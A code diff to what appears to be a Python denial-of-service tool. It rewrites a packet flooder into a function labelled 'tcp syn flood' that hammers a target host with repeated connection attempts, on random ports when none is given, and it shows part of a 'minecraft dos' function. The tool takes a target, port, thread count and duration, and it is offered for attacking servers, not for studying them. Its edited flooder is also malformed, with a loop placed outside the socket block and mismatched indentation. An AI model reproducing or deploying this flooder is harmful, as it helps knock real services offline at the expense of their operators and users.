@@ -13,6 +13,8 @@ from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
+from sys import argv
+from threading import Thread
 init(convert=True)
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -255,7 +257,7 @@ def get_info_l4():
     return target, port, thread, t
 ##############################################################################################
 
-#region layer4
+#tcp syn flood
 def runflooder(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     rand = random._urandom(4096)
@@ -267,13 +269,14 @@ def runflooder(host, port, th, t):
             pass
 
 def flooder(host, port, rand, until_datetime):
-    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.setblocking(0)
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            sock.sendto(rand, (host, int(port)))
-        except:
-            sock.close()
-            pass
+            try:
+                dport = random.randint(1, 65535) if port == 0 else port
+                sock.connect((host, dport))
+            except:
+                pass
 #minecraft dos
 def runmine(host, port, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
